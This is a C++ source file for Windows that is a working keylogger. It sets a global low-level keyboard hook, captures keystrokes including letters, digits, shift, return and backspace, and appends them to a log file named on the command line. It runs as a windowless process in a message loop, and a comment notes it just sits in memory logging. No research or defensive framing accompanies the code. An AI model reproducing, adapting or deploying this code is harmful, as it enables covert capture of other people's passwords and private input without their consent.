#define _CRT_SECURE_NO_WARNINGS
#include <fstream>
#include <stdlib.h>
#include <windows.h>
#include <vector>
#include <string>
#include <sstream>

std::string fileName;
std::vector<std::string> codepointStringBuffer;

static void DumpCharacterBuffer() {

    std::ofstream ofs(fileName, std::ios_base::app);
    
    for (const std::string& codepointString : codepointStringBuffer) {
        ofs << codepointString;    }

    codepointStringBuffer.clear();
    ofs.close();
}

LRESULT CALLBACK KeyboardProc(int nCode,
                              WPARAM wParam, 
                              LPARAM lParam) {

    PKBDLLHOOKSTRUCT pHookStruct = (PKBDLLHOOKSTRUCT) lParam;
    int vkCode = pHookStruct->vkCode;

    switch (wParam) {
        case WM_KEYUP:
        case WM_SYSKEYUP:

            if (vkCode == VK_LSHIFT) {
                codepointStringBuffer.push_back(std::string("<VK_LSHIFT up>"));
            } else if (vkCode == VK_RSHIFT) {
                codepointStringBuffer.push_back(std::string("<VK_RSHIFT up>"));
            }

            if (codepointStringBuffer.size() >= 30) {
                DumpCharacterBuffer();
            }

            break;

        case WM_KEYDOWN:
        case WM_SYSKEYDOWN:

            if (vkCode == VK_LSHIFT) {
                codepointStringBuffer.push_back(std::string("<VK_LSHIFT down>"));
            } else if (vkCode == VK_RSHIFT) {
                codepointStringBuffer.push_back(std::string("<VK_RSHIFT down>"));
            } else if (vkCode == VK_SPACE) {
                codepointStringBuffer.push_back(std::string(" "));
            } else if (vkCode == VK_CAPITAL) {
                codepointStringBuffer.push_back(std::string("<CAPS LOCK>"));
            } else if (vkCode == VK_RETURN) {
                codepointStringBuffer.push_back(std::string("<RETURN>"));
            } else if (vkCode == VK_BACK) {
                codepointStringBuffer.push_back(std::string("<BACKWARDS>"));
            } else if (vkCode == VK_TAB) {
                codepointStringBuffer.push_back(std::string("<TAB>"));
            } else {
                char ch = (char) vkCode;

                if (std::isalnum(vkCode)) {
                    std::stringstream ss;
                    ss << ch;
                    std::string s;
                    ss >> s;
                    codepointStringBuffer.push_back(s);
                }
            }

            if (codepointStringBuffer.size() > 30) {
                DumpCharacterBuffer();
            }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WinMain(HINSTANCE hInstance,
            HINSTANCE hPrevInstance,
            LPSTR pCmdLine,
            int nCmdShow) {

    fileName = pCmdLine;    

    // Mark the start of session:
    std::ofstream ofs(fileName, std::ios_base::app);
    ofs << "<START>";
    ofs.close();

    SetWindowsHookExA(WH_KEYBOARD_LL,
                      KeyboardProc,
                      NULL,
                      0);
    MSG msg;
        
    // Just seat in the memory while logging. :^)
    while (GetMessage(&msg, NULL, NULL, NULL)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return EXIT_SUCCESS;
}